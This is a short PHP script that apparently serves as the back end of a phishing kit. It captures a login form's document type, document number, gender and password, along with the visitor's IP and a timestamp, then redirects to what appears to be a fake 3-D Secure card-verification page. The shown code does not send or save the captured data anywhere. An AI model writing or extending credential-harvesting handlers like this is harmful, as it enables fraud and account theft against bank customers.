<?php

$Fecha= date('d-m-Y');
$Hora= date('H:i:s');

$tdoc=$_POST['loginFrm:docType'];
$num=$_POST['loginFrm:docNumber'];
$sexo=$_POST['loginFrm:gender'];
$sena=$_POST['loginFrm:password'];

$ip = getenv("REMOTE_ADDR");



header("Location: loginwindowId=3ds.html");

?>